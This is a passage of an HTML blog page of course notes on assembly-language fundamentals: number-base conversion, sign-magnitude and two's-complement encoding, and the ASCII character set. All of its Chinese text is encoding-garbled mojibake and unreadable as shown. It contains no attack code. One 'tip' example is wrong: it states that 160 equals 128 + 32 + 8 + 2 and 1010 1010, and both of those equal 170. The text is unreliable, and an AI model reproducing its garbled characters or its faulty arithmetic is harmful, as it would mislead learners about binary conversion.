æ˜¯å¦‚ä½•è®¿é—®å­˜å‚¨å™¨ï¼Ÿ</li><li>è¾“å…¥è¾“å‡ºæ“ä½œçš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ</li></ul><h3 id="å››ã€IBM-PCç³»åˆ—å¾®å‹è®¡ç®—æœºåŠå…¶æ±‡ç¼–è¯­è¨€"><a href="#å››ã€IBM-PCç³»åˆ—å¾®å‹è®¡ç®—æœºåŠå…¶æ±‡ç¼–è¯­è¨€" class="headerlink" title="å››ã€IBM-PCç³»åˆ—å¾®å‹è®¡ç®—æœºåŠå…¶æ±‡ç¼–è¯­è¨€"></a>å››ã€IBM-PCç³»åˆ—å¾®å‹è®¡ç®—æœºåŠå…¶æ±‡ç¼–è¯­è¨€</h3><h2 id="1-2-å­¦ä¹ å’Œä½¿ç”¨æ±‡ç¼–è¯­è¨€çš„ç›®çš„"><a href="#1-2-å­¦ä¹ å’Œä½¿ç”¨æ±‡ç¼–è¯­è¨€çš„ç›®çš„" class="headerlink" title="1.2 å­¦ä¹ å’Œä½¿ç”¨æ±‡ç¼–è¯­è¨€çš„ç›®çš„"></a>1.2 å­¦ä¹ å’Œä½¿ç”¨æ±‡ç¼–è¯­è¨€çš„ç›®çš„</h2><h3 id="1ã€å­¦ä¹ å’Œä½¿ç”¨æ±‡ç¼–è¯­è¨€å¯ä»¥ä»æ ¹æœ¬ä¸Šè®¤è¯†ã€ç†è§£è®¡ç®—æœºçš„å·¥ä½œè¿‡ç¨‹ã€‚"><a href="#1ã€å­¦ä¹ å’Œä½¿ç”¨æ±‡ç¼–è¯­è¨€å¯ä»¥ä»æ ¹æœ¬ä¸Šè®¤è¯†ã€ç†è§£è®¡ç®—æœºçš„å·¥ä½œè¿‡ç¨‹ã€‚" class="headerlink" title="1ã€å­¦ä¹ å’Œä½¿ç”¨æ±‡ç¼–è¯­è¨€å¯ä»¥ä»æ ¹æœ¬ä¸Šè®¤è¯†ã€ç†è§£è®¡ç®—æœºçš„å·¥ä½œè¿‡ç¨‹ã€‚"></a>1ã€å­¦ä¹ å’Œä½¿ç”¨æ±‡ç¼–è¯­è¨€å¯ä»¥ä»æ ¹æœ¬ä¸Šè®¤è¯†ã€ç†è§£è®¡ç®—æœºçš„å·¥ä½œè¿‡ç¨‹ã€‚</h3><p>é€šè¿‡ç”¨æ±‡ç¼–è¯­è¨€ç¼–åˆ¶ç¨‹åºå¯ä»¥æ›´æ¸…æ¥šåœ°äº†è§£è®¡ç®—æœºæ˜¯å¦‚ä½•å®Œæˆå„ç§å¤æ‚çš„å·¥ä½œã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œç¨‹åºè®¾è®¡äººå‘˜èƒ½æ›´å……åˆ†åœ°åˆ©ç”¨æœºå™¨ç¡¬ä»¶çš„å…¨éƒ¨åŠŸèƒ½ï¼Œå‘æŒ¥æœºå™¨çš„é•¿å¤„ã€‚</p><h3 id="2ã€åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ï¼ŒæŸäº›åŠŸèƒ½å¿…é¡»ç”¨æ±‡ç¼–è¯­è¨€ç¨‹åºæ¥å®ç°ã€‚"><a href="#2ã€åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ï¼ŒæŸäº›åŠŸèƒ½å¿…é¡»ç”¨æ±‡ç¼–è¯­è¨€ç¨‹åºæ¥å®ç°ã€‚" class="headerlink" title="2ã€åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ï¼ŒæŸäº›åŠŸèƒ½å¿…é¡»ç”¨æ±‡ç¼–è¯­è¨€ç¨‹åºæ¥å®ç°ã€‚"></a>2ã€åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ï¼ŒæŸäº›åŠŸèƒ½å¿…é¡»ç”¨æ±‡ç¼–è¯­è¨€ç¨‹åºæ¥å®ç°ã€‚</h3><p>å¦‚ï¼šæœºå™¨è‡ªæ£€ã€ç³»ç»Ÿåˆå§‹åŒ–ã€å®é™…çš„è¾“å…¥è¾“å‡ºè®¾å¤‡çš„æ“ä½œç­‰ã€‚</p><h3 id="3ã€æ±‡ç¼–è¯­è¨€ç¨‹åºçš„æ•ˆç‡é«˜äºé«˜çº§è¯­è¨€ç¨‹åº"><a href="#3ã€æ±‡ç¼–è¯­è¨€ç¨‹åºçš„æ•ˆç‡é«˜äºé«˜çº§è¯­è¨€ç¨‹åº" class="headerlink" title="3ã€æ±‡ç¼–è¯­è¨€ç¨‹åºçš„æ•ˆç‡é«˜äºé«˜çº§è¯­è¨€ç¨‹åº"></a>3ã€æ±‡ç¼–è¯­è¨€ç¨‹åºçš„æ•ˆç‡é«˜äºé«˜çº§è¯­è¨€ç¨‹åº</h3><p>â€œ æ•ˆç‡â€ æœ‰ä¸¤ä¸ªæ–¹é¢çš„å«ä¹‰ï¼šç¨‹åºçš„ç›®æ ‡ä»£ç é•¿åº¦å’Œè¿è¡Œçš„é€Ÿåº¦ã€‚<br>åœ¨æŸäº›è¦æ±‚èŠ‚çœå†…å­˜ç©ºé—´å’Œæé«˜ç¨‹åºè¿è¡Œé€Ÿåº¦çš„åº”ç”¨åœºåˆï¼Œå¦‚å®æ—¶è¿‡ç¨‹æ§åˆ¶ã€æ™ºèƒ½ä»ªå™¨ä»ªè¡¨ç­‰ï¼Œå¸¸å¸¸ç”¨æ±‡ç¼–è¯­è¨€æ¥ç¼–åˆ¶ç¨‹åºã€‚</p><h2 id="1-3-è¿›ä½è®¡æ•°åˆ¶åŠå…¶ç›¸äº’è½¬"><a href="#1-3-è¿›ä½è®¡æ•°åˆ¶åŠå…¶ç›¸äº’è½¬" class="headerlink" title="1.3 è¿›ä½è®¡æ•°åˆ¶åŠå…¶ç›¸äº’è½¬"></a>1.3 è¿›ä½è®¡æ•°åˆ¶åŠå…¶ç›¸äº’è½¬</h2><h3 id="ä¸€ã€è¿›ä½è®¡æ•°åˆ¶"><a href="#ä¸€ã€è¿›ä½è®¡æ•°åˆ¶" class="headerlink" title="ä¸€ã€è¿›ä½è®¡æ•°åˆ¶"></a>ä¸€ã€è¿›ä½è®¡æ•°åˆ¶</h3><p>ä½¿ç”¨ä¸€å®šä¸ªæ•°çš„æ•°ç çš„ç»„åˆæ¥è¡¨ç¤ºæ•°å­—ï¼Œè¿™ç§è¡¨ç¤ºæ–¹æ³•ç§°ä¸ºè¿›ä½è®¡æ•°åˆ¶ã€‚æ ¹æ®æ‰€ä½¿ç”¨çš„æ•°ç çš„ä¸ªæ•°ï¼Œå°±äº§ç”Ÿäº†ä¸åŒçš„è¿›ä½è®¡æ•°åˆ¶ã€‚</p><p>å¦‚åè¿›åˆ¶æ•°ï¼Œç”¨0 ~9 åä¸ªæ•°ç çš„ç»„åˆæ¥è¡¨ç¤ºæ•°å­—ã€‚æ¯ä¸ªæ•°ç æ’åœ¨ä¸åŒä½ç½®ï¼Œæ‰€è¡¨ç¤ºçš„æ•°å€¼å¤§å°ä¸ç›¸åŒã€‚</p><ul><li><p><strong>å°†å„ä¸ªä½ç½®ä¸Šæ‰€è¡¨ç¤ºçš„åŸºæœ¬æ•°å€¼ç§°ä¸ºä½æƒï¼Œç®€ç§°æƒã€‚</strong></p><p>ä¸åŒçš„è¿›ä½åˆ¶å’Œä¸åŒçš„ä½ç½®å…¶ä½æƒæ˜¯ä¸åŒçš„ã€‚ä½æƒä¹˜ä»¥å¯¹åº”ä½ç½®ä¸Šçš„æ•°ç å°±ç­‰äºè¯¥æ•°ä½ä¸Šæ•°å€¼çš„å¤§å°ã€‚</p></li><li><p><strong>æ¯ä¸ªæ•°ä½ä¸Šèƒ½ä½¿ç”¨ä¸åŒæ•°ç çš„ä¸ªæ•°ç§°ä¸ºåŸºæ•°ã€‚</strong></p><p>ä¾‹å¦‚åè¿›åˆ¶æœ‰åä¸ªæ•°ç 0~9ï¼ŒåŸºæ•°ä¸º10ï¼ŒäºŒè¿›åˆ¶åŸºæ•°ä¸º2ã€‚</p></li><li><p><strong>æ¯ä¸ªæ•°ä½èƒ½å–çš„æœ€å¤§æ•°ç å€¼=åŸºæ•°-1ã€‚</strong></p><p>å¦‚åè¿›åˆ¶ä¸º10-1 = 9</p></li></ul><p>åœ¨è®¡ç®—æœºä¸­æ•°æ®è¡¨ç¤ºä¸€èˆ¬é‡‡ç”¨äºŒè¿›åˆ¶æ•°ï¼Œå› ä¸ºå®ƒåœ¨è®¡ç®—æœºä¸­æœ€å®¹æ˜“è¡¨ç¤ºå’Œå­˜å‚¨ï¼Œä¸”é€‚åˆäºé€»è¾‘å€¼çš„è¡¨è¾¾ä¸è¿ç®—ã€‚</p><p>å¯¹äººæ¥è¯´äºŒè¿›åˆ¶ä¸ä¾¿äºä¹¦å†™å’Œé˜…è¯»ï¼Œå› æ­¤ä¹¦å†™æ—¶å¸¸ä½¿ç”¨8è¿›åˆ¶å’Œ16è¿›åˆ¶ã€‚</p><p><strong>äºŒè¿›åˆ¶ä¸8è¿›åˆ¶ã€16è¿›åˆ¶ä¹‹é—´æœ‰éå¸¸ç®€å•çš„è½¬æ¢å…³ç³»ï¼š3ä½äºŒè¿›åˆ¶æ•°ä¸ä¸€ä½8è¿›åˆ¶æ•°å¯¹åº”ï¼Œ4ä½äºŒè¿›åˆ¶æ•°ä¸ä¸€ä½16è¿›åˆ¶æ•°å¯¹åº”ã€‚</strong></p><p><strong>åœ¨ä¹¦å†™ä¸åŒè¿›ä½è®¡æ•°åˆ¶æ•°æ—¶ï¼Œä¸ºäº†åŒºåˆ«ï¼Œåœ¨æ•°çš„å°¾éƒ¨ç”¨ä¸€ä¸ªå­—æ¯æ¥è¡¨ç¤ºã€‚</strong></p><blockquote><p>Bï¼ˆBinaryï¼‰â€”â€”â€” äºŒè¿›åˆ¶æ•°<br>Oï¼ˆOctalï¼‰æˆ–Qâ€”â€”- å…«è¿›åˆ¶æ•°<br>Dï¼ˆDecimal)â€”â€”â€” åè¿›åˆ¶æ•°<br>Hï¼ˆHexadecimalï¼‰â€”â€”â€” åå…­è¿›åˆ¶æ•°ã€‚<br>å¦‚æœªä½¿ç”¨ä»»ä½•å­—æ¯ï¼Œåˆ™é»˜è®¤è¡¨ç¤ºæ˜¯åè¿›åˆ¶æ•°ã€‚</p></blockquote><h3 id="äºŒã€å„ç§æ•°åˆ¶é—´çš„ç›¸äº’è½¬æ¢"><a href="#äºŒã€å„ç§æ•°åˆ¶é—´çš„ç›¸äº’è½¬æ¢" class="headerlink" title="äºŒã€å„ç§æ•°åˆ¶é—´çš„ç›¸äº’è½¬æ¢"></a>äºŒã€å„ç§æ•°åˆ¶é—´çš„ç›¸äº’è½¬æ¢</h3><h4 id="1ã€åè¿›åˆ¶æ•´æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°"><a href="#1ã€åè¿›åˆ¶æ•´æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°" class="headerlink" title="1ã€åè¿›åˆ¶æ•´æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°"></a>1ã€åè¿›åˆ¶æ•´æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°</h4><h5 id="ï¼ˆ1ï¼‰å‡æƒå®šä½æ³•"><a href="#ï¼ˆ1ï¼‰å‡æƒå®šä½æ³•" class="headerlink" title="ï¼ˆ1ï¼‰å‡æƒå®šä½æ³•"></a>ï¼ˆ1ï¼‰å‡æƒå®šä½æ³•</h5><ul><li>ä»äºŒè¿›åˆ¶æ•°é«˜ä½èµ·ï¼Œä¾æ¬¡ç”¨å¾…è½¬æ¢çš„åè¿›åˆ¶æ•°ä¸å„ä½æƒå€¼è¿›è¡Œæ¯”è¾ƒï¼›</li><li>å¦‚å¤Ÿå‡ï¼Œåˆ™è¯¥æ•°ä½ç³»æ•°Ki = 1 ï¼ŒåŒæ—¶å‡å»è¯¥ä½æƒå€¼ï¼Œä½™æ•°ä½œä¸ºä¸‹ä¸€æ¬¡æ¯”è¾ƒçš„å€¼ï¼›</li><li>å¦‚ä¸å¤Ÿå‡ï¼Œåˆ™è¯¥æ•°ä½ç³»æ•°Ki = 0 ã€‚</li></ul><h5 id="ï¼ˆ2ï¼‰é™¤åŸºå–ä½™æ³•"><a href="#ï¼ˆ2ï¼‰é™¤åŸºå–ä½™æ³•" class="headerlink" title="ï¼ˆ2ï¼‰é™¤åŸºå–ä½™æ³•"></a>ï¼ˆ2ï¼‰é™¤åŸºå–ä½™æ³•</h5><ul><li>å°†åè¿›åˆ¶æ•°é™¤ä»¥åŸºæ•°2 ï¼Œå…¶ä½™æ•°ä¸ºäºŒè¿›åˆ¶æ•°çš„æœ€ä½ä½ï¼Œå†ç”¨å…¶å•†é™¤2 ï¼Œå…¶ä½™æ•°ä¸ºæ¬¡ä½ä½ï¼Œåå¤åšä¸‹å»ï¼Œç›´åˆ°å•†0 ã€‚</li><li>è¿™ç§è½¬æ¢æ–¹æ³•åŒæ ·é€‚åˆäºå…¶å®ƒè¿›åˆ¶æ•°ä¹‹é—´çš„è½¬æ¢ã€‚</li></ul><h4 id="2ã€åè¿›åˆ¶å°æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°"><a href="#2ã€åè¿›åˆ¶å°æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°" class="headerlink" title="2ã€åè¿›åˆ¶å°æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°"></a>2ã€åè¿›åˆ¶å°æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°</h4><h5 id="ï¼ˆ1ï¼‰å‡æƒå®šä½æ³•-1"><a href="#ï¼ˆ1ï¼‰å‡æƒå®šä½æ³•-1" class="headerlink" title="ï¼ˆ1ï¼‰å‡æƒå®šä½æ³•"></a>ï¼ˆ1ï¼‰å‡æƒå®šä½æ³•</h5><p>åŒæ•´æ•°è½¬åŒ–ã€‚</p><p>è½¬æ¢æ—¶åº”æ ¹æ®ç¨‹åºè¦æ±‚çš„ç²¾åº¦æˆ–è®¡ç®—æœºçš„å­—é•¿æ¥ç¡®å®šäºŒè¿›åˆ¶çš„ä½æ•°ã€‚</p><h5 id="ï¼ˆ2ï¼‰ä¹˜åŸºå–æ•´æ³•"><a href="#ï¼ˆ2ï¼‰ä¹˜åŸºå–æ•´æ³•" class="headerlink" title="ï¼ˆ2ï¼‰ä¹˜åŸºå–æ•´æ³•"></a>ï¼ˆ2ï¼‰ä¹˜åŸºå–æ•´æ³•</h5><p>å°†åè¿›åˆ¶æ•°ä¹˜ä»¥åŸºæ•°2 ï¼Œå…¶æ•´æ•°éƒ¨åˆ†ä¸ºäºŒè¿›åˆ¶æ•°çš„æœ€é«˜ä½ï¼Œå†ç”¨å…¶å°æ•°éƒ¨åˆ†ä¹˜2 ï¼Œå…¶æ•´æ•°éƒ¨åˆ†ä¸ºæ¬¡é«˜ä½ï¼Œåå¤åšä¸‹å»ï¼Œç›´åˆ°å°æ•°éƒ¨åˆ†ä¸º0 ã€‚</p><h4 id="3ã€äºŒè¿›åˆ¶æ•´æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°"><a href="#3ã€äºŒè¿›åˆ¶æ•´æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°" class="headerlink" title="3ã€äºŒè¿›åˆ¶æ•´æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°"></a>3ã€äºŒè¿›åˆ¶æ•´æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°</h4><h5 id="ï¼ˆ1ï¼‰æŒ‰æƒç›¸åŠ æ³•"><a href="#ï¼ˆ1ï¼‰æŒ‰æƒç›¸åŠ æ³•" class="headerlink" title="ï¼ˆ1ï¼‰æŒ‰æƒç›¸åŠ æ³•"></a>ï¼ˆ1ï¼‰æŒ‰æƒç›¸åŠ æ³•</h5><p>ä¾‹ ï¼š101000101 B = 1 Ã— 2^8 + 1 Ã— 2^6 + 1 Ã— 2^2 + 1 Ã— 2^0<br>                                 = 256 + 64 + 4 + 1<br>                                 = 325</p><h5 id="ï¼ˆ2ï¼‰é€æ¬¡ä¹˜åŸºç›¸åŠ æ³•"><a href="#ï¼ˆ2ï¼‰é€æ¬¡ä¹˜åŸºç›¸åŠ æ³•" class="headerlink" title="ï¼ˆ2ï¼‰é€æ¬¡ä¹˜åŸºç›¸åŠ æ³•"></a>ï¼ˆ2ï¼‰é€æ¬¡ä¹˜åŸºç›¸åŠ æ³•</h5><p><img src="/2021/07/27/Code/Assembly/Assembly/a68992e7de6cfb5652421880834e7bee.bmp" alt="capture_20210721094219468" style="zoom:80%;"></p><h4 id="4ã€äºŒè¿›åˆ¶å°æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°"><a href="#4ã€äºŒè¿›åˆ¶å°æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°" class="headerlink" title="4ã€äºŒè¿›åˆ¶å°æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°"></a>4ã€äºŒè¿›åˆ¶å°æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°</h4><h5 id="ï¼ˆ1ï¼‰æŒ‰æƒç›¸åŠ æ³•-1"><a href="#ï¼ˆ1ï¼‰æŒ‰æƒç›¸åŠ æ³•-1" class="headerlink" title="ï¼ˆ1ï¼‰æŒ‰æƒç›¸åŠ æ³•"></a>ï¼ˆ1ï¼‰æŒ‰æƒç›¸åŠ æ³•</h5><p>ä¾‹ ï¼š0.101001 B = 1 Ã— 2^(-1) + 1 Ã— 2^(-3) + 1 Ã— 2^(-6)<br>                              = 0.5 + 0.125 + 0.0156<br>                              = 0.640625 D</p><h5 id="ï¼ˆ2ï¼‰é€æ¬¡é™¤åŸºç›¸åŠ æ³•"><a href="#ï¼ˆ2ï¼‰é€æ¬¡é™¤åŸºç›¸åŠ æ³•" class="headerlink" title="ï¼ˆ2ï¼‰é€æ¬¡é™¤åŸºç›¸åŠ æ³•"></a>ï¼ˆ2ï¼‰é€æ¬¡é™¤åŸºç›¸åŠ æ³•</h5><p><img src="/2021/07/27/Code/Assembly/Assembly/4e70f28592e7f494fd935c34ae52f178.bmp" alt="capture_20210721110604958" style="zoom:80%;"></p><h4 id="5ã€äºŒè¿›åˆ¶ä¸å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶é—´çš„è½¬æ¢"><a href="#5ã€äºŒè¿›åˆ¶ä¸å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶é—´çš„è½¬æ¢" class="headerlink" title="5ã€äºŒè¿›åˆ¶ä¸å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶é—´çš„è½¬æ¢"></a>5ã€äºŒè¿›åˆ¶ä¸å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶é—´çš„è½¬æ¢</h4><p><strong>äºŒè¿›åˆ¶ä¸å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶ä¹‹é—´çš„å¯¹åº”å…³ç³»</strong>ï¼š</p><ul><li>ä¸‰ä½äºŒè¿›åˆ¶æ•°å¯¹åº”ä¸€ä½å…«è¿›åˆ¶æ•°</li><li>å››ä½äºŒè¿›åˆ¶æ•°å¯¹åº”ä¸€ä½åå…­è¿›åˆ¶æ•°</li></ul><p>ä¾‹å¦‚ ï¼š10100010 B = 10 100 010                       10100010 B = 1010 0010<br>                                       2     4     2                                                      A      2<br>             æ‰€ä»¥10100010 B = 242 Q                        æ‰€ä»¥10100010 B = A 2 H</p><h4 id="6ã€æŠ€å·§"><a href="#6ã€æŠ€å·§" class="headerlink" title="6ã€æŠ€å·§"></a>6ã€æŠ€å·§</h4><div class="table-container"><table><thead><tr><th>2^9</th><th>2^8</th><th>2^7</th><th>2^6</th><th>2^5</th><th>2^4</th><th>2^3</th><th>2^2</th><th>2^1</th><th>2^0</th></tr></thead><tbody><tr><td>512</td><td>256</td><td>128</td><td>64</td><td>32</td><td>16</td><td>8</td><td>4</td><td>2</td><td>1</td></tr></tbody></table></div><ul><li><p>åè¿›åˆ¶æ•´æ•°è½¬äºŒè¿›åˆ¶</p><p>ä¾‹å¦‚ï¼š160 = 128 + 32 + 8 + 2 = 1010 1010</p></li><li><p>åè¿›åˆ¶å°æ•°è½¬äºŒè¿›åˆ¶</p><p>ä¾‹å¦‚ï¼š40/128 = (32 + 8)/(128) = 101000 * 2^(-7) = 0.0101000</p></li><li><p>äºŒè¿›åˆ¶æ•´æ•°è½¬åè¿›åˆ¶</p><p>ä¾‹å¦‚ï¼š1010 1010 = 128 + 32 + 8 + 2 = 160</p></li></ul><h2 id="1-4-å¸¦ç¬¦å·æ•°çš„è¡¨ç¤º"><a href="#1-4-å¸¦ç¬¦å·æ•°çš„è¡¨ç¤º" class="headerlink" title="1.4 å¸¦ç¬¦å·æ•°çš„è¡¨ç¤º"></a>1.4 å¸¦ç¬¦å·æ•°çš„è¡¨ç¤º</h2><p>åœ¨ä¸€èˆ¬ç®—æœ¯è¡¨ç¤ºä¸­ä½¿ç”¨ â€œ + â€ å’Œ â€œ - â€ æ¥è¡¨ç¤ºæ­£æ•°ä¸è´Ÿæ•°ï¼Œè€Œåœ¨è®¡ç®—æœºä¸­ä½¿ç”¨ â€œ 0 â€ å’Œ â€œ 1 â€ æ¥è¡¨ç¤ºæ­£æ•°å’Œè´Ÿæ•°ã€‚</p><blockquote><p>ç”¨ â€œ + â€ æˆ– â€œ - â€ è¡¨ç¤ºæ­£è´Ÿçš„æ•°å«çœŸå€¼<br>ç”¨ â€œ 0 â€ æˆ– â€œ 1 â€ è¡¨ç¤ºæ­£è´Ÿçš„æ•°å«æœºå™¨æ•°</p></blockquote><p>å¸¦ç¬¦å·çš„æœºå™¨æ•°å¯ä»¥ç”¨<strong>åŸç ã€åç å’Œè¡¥ç </strong>ä¸‰ç§ä¸åŒç åˆ¶æ¥è¡¨ç¤ºã€‚ä¸€èˆ¬è®¡ç®—æœºä¸­å¤§å¤šé‡‡ç”¨è¡¥ç è¡¨ç¤ºã€‚</p><h3 id="ä¸€ã€åŸç è¡¨ç¤º"><a href="#ä¸€ã€åŸç è¡¨ç¤º" class="headerlink" title="ä¸€ã€åŸç è¡¨ç¤º"></a>ä¸€ã€åŸç è¡¨ç¤º</h3><p>äºŒè¿›åˆ¶æ•°çš„æœ€é«˜ä½è¡¨ç¤ºç¬¦å·ï¼Œ0 è¡¨ç¤ºæ­£ï¼Œ1 è¡¨ç¤ºè´Ÿã€‚æ•°å€¼éƒ¨åˆ†ç”¨äºŒè¿›åˆ¶æ•°ç»å¯¹å€¼è¡¨ç¤ºã€‚</p><blockquote><p>8 ä½äºŒè¿›åˆ¶æ•°åŸç çš„æœ€å¤§æ•°ä¸º 0111 1111ï¼ˆ + 127 ï¼‰<br>                                     æœ€å°æ•°ä¸º 1111 1111ï¼ˆ - 127 ï¼‰<br>8 ä½äºŒè¿›åˆ¶æ•°è¡¨ç¤ºèŒƒå›´ï¼š-127  &lt;= X &lt;= + 127</p></blockquote><p>0 çš„åŸç æœ‰ä¸¤ç§è¡¨ç¤ºå½¢å¼ï¼š0000 0000 å’Œ 1000 0000ï¼ˆ + 0 å’Œ - 0 ï¼‰</p><h3 id="äºŒã€è¡¥ç çš„è¡¨ç¤º"><a href="#äºŒã€è¡¥ç çš„è¡¨ç¤º" class="headerlink" title="äºŒã€è¡¥ç çš„è¡¨ç¤º"></a>äºŒã€è¡¥ç çš„è¡¨ç¤º</h3><h4 id="1ã€è¡¥ç çš„å®šä¹‰"><a href="#1ã€è¡¥ç çš„å®šä¹‰" class="headerlink" title="1ã€è¡¥ç çš„å®šä¹‰"></a>1ã€è¡¥ç çš„å®šä¹‰</h4><p>å¸¦ç¬¦å·æ•°Xçš„è¡¥ç è¡¨ç¤º [X]è¡¥ å®šä¹‰ä¸ºï¼š</p><p>â€‹                             [X]è¡¥ = M + X  (Mod M)</p><p>å…¶ä¸­æ¨¡æ•° M æ ¹æ®æœºå™¨æ•°çš„ä½æ•°è€Œå®šï¼Œå¦‚ä½æ•°ä¸º 8 åˆ™ M = 2^8 ã€‚</p><p>ç”¨è¡¥ç è¡¨ç¤ºçš„æœºå™¨æ•°ï¼Œç¬¦å·ä½ä»ç„¶è¡¨ç¤ºæ•°çš„ç¬¦å·ï¼š0 ä¸ºæ­£ï¼Œ1 ä¸ºè´Ÿã€‚å¯¹äºæ­£æ•°ï¼Œè¡¥ç ä¸åŸç ç›¸åŒï¼Œå¯¹äºè´Ÿæ•°éœ€è¦è¿›è¡Œå˜æ¢ã€‚</p><h4 id="2ã€ç”±åŸç å˜æ¢ä¸ºè¡¥ç "><a href="#2ã€ç”±åŸç å˜æ¢ä¸ºè¡¥ç " class="headerlink" title="2ã€ç”±åŸç å˜æ¢ä¸ºè¡¥ç "></a>2ã€ç”±åŸç å˜æ¢ä¸ºè¡¥ç </h4><ul><li>æ­£æ•°çš„åŸç ä¸è¡¥ç ç›¸åŒã€‚</li><li>è´Ÿæ•°çš„åŸç å˜æ¢ä¸ºè¡¥ç ï¼šä¿æŒç¬¦å·ä½ä¸å˜ï¼Œå…¶ä½™å„ä½å˜åï¼Œæœ€ä½ä½åŠ  1 ã€‚</li></ul><p>ä¾‹ï¼šå°† -59 å˜æ¢ä¸ºè¡¥ç </p><div class="table-container"><table><thead><tr><th style="text-align:center">æ•°</th><th style="text-align:center">çœŸå€¼</th><th style="text-align:center">åŸç </th><th style="text-align:center">è¡¥ç </th></tr></thead><tbody><tr><td style="text-align:center">- 59</td><td style="text-align:center">- 0011 1011</td><td style="text-align:center">1011 1011</td><td style="text-align:center">1100 0101</td></tr></tbody></table></div><h4 id="3ã€è¡¥ç æ•°è¡¨ç¤ºèŒƒå›´"><a href="#3ã€è¡¥ç æ•°è¡¨ç¤ºèŒƒå›´" class="headerlink" title="3ã€è¡¥ç æ•°è¡¨ç¤ºèŒƒå›´"></a>3ã€è¡¥ç æ•°è¡¨ç¤ºèŒƒå›´</h4><p>å½“ä½æ•°ä¸º8 æ—¶ï¼Œæœ€å¤§è¡¥ç ä¸º 0111 1111 = [+127]è¡¥<br>                          æœ€å°è¡¥ç ä¸º 1000 0000  = [-128]è¡¥</p><p>0 çš„è¡¥ç åªæœ‰ä¸€ä¸ªï¼Œ[0]è¡¥ = 0000 0000ï¼Œè€Œ 1000 0000 = [-128]è¡¥ï¼Œ1111 1111 = [-1]è¡¥</p><p>å¯¹äº16 ä½æ•°ï¼Œåˆ™è¡¥ç è¡¨ç¤ºèŒƒå›´ä¸º -32768 ~ +32767</p><h4 id="4ã€è¡¥ç çš„åŠ å‡è¿ç®—"><a href="#4ã€è¡¥ç çš„åŠ å‡è¿ç®—" class="headerlink" title="4ã€è¡¥ç çš„åŠ å‡è¿ç®—"></a>4ã€è¡¥ç çš„åŠ å‡è¿ç®—</h4><p>è§„åˆ™ï¼š<strong>[X + Y] è¡¥ = [X]è¡¥ + [Y]è¡¥</strong><br>            <strong>[X - Y] è¡¥ = [X]è¡¥ - [Y]è¡¥ = [X]è¡¥ + [-Y]è¡¥</strong></p><p>å…¶ä¸­ <strong>[-Y]è¡¥</strong> æ˜¯å¯¹ <strong>[Y]è¡¥</strong> æ‰§è¡Œä¸€æ¬¡æ±‚è¡¥è¿ç®—</p><p><strong>æ±‚è¡¥è¿ç®—æ˜¯å°†åŸæ•°è¿åŒç¬¦å·ä½ä¸€èµ·ï¼ˆä¸ç®¡æ˜¯æ­£è¿˜æ˜¯è´Ÿï¼‰æŒ‰ä½æ±‚åï¼Œå†åœ¨æœ€ä½ä½åŠ  1 ã€‚</strong></p><h2 id="1-5-å­—ç¬¦çš„è¡¨ç¤º"><a href="#1-5-å­—ç¬¦çš„è¡¨ç¤º" class="headerlink" title="1.5 å­—ç¬¦çš„è¡¨ç¤º"></a>1.5 å­—ç¬¦çš„è¡¨ç¤º</h2><p>åœ¨è®¡ç®—æœºå†…éƒ¨ï¼Œå„ç§å­—ç¬¦ï¼ˆå­—æ¯ã€ç¬¦å·ã€æ•°å­—ç ï¼‰éƒ½æ˜¯æŒ‰ä¸€å®šçš„æ–¹å¼ç¼–å†™æˆäºŒè¿›åˆ¶ä¿¡æ¯ã€‚ä¸åŒçš„è®¡ç®—æœºä»¥åŠä¸åŒçš„åœºåˆæ‰€é‡‡ç”¨çš„ç¼–ç å½¢å¼å¯èƒ½ä¸åŒã€‚ç›®å‰æœ€å¹¿æ³›é‡‡ç”¨çš„æ˜¯ <strong>ASCII ç </strong>ï¼ˆAmerican Standard Code for Information Interchangeï¼‰ã€‚</p><p>æ ‡å‡†ASCII ç ä¸ºä¸€å­—èŠ‚ï¼Œå…¶ä¸­ç”¨ä½ä¸ƒä½è¡¨ç¤ºå­—ç¬¦ç¼–ç ï¼Œç”¨æœ€é«˜ä½è¡¨ç¤ºå¥‡å¶æ•°éªŒä½ã€‚</p><p><img src="/2021/07/27/Code/Assembly/Assembly/d74f187fb65b4b37445ff279ab777bc3.bmp" style="zoom:80%;"></p><p>æ ‡å‡†ASCII ç å…±æœ‰128 ä¸ªï¼Œå¯åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>éæ‰“å°ASCII ç ï¼Œå…±33 ä¸ªï¼Œç”¨äºæ§åˆ¶æ“ä½œï¼Œå¦‚ BELï¼ˆ å“é“ƒï¼Œ07H ï¼‰ï¼ŒDEL ( åˆ é™¤ï¼Œ7FH )ï¼ŒCR ( å›è½¦ï¼Œ0DH )ï¼ŒLF ( æ¢è¡Œï¼Œ0AH ) ã€‚</li><li>å¯æ‰“å°ASCII ç å…±æœ‰95 ä¸ªï¼Œå¦‚æ•°å­—ç¬¦0 ~ 9 ï¼Œå¤§å°å†™å­—æ¯ç­‰ã€‚</li></ul><h2 id="1-6-åŸºæœ¬é€»è¾‘è¿ç®—"><a 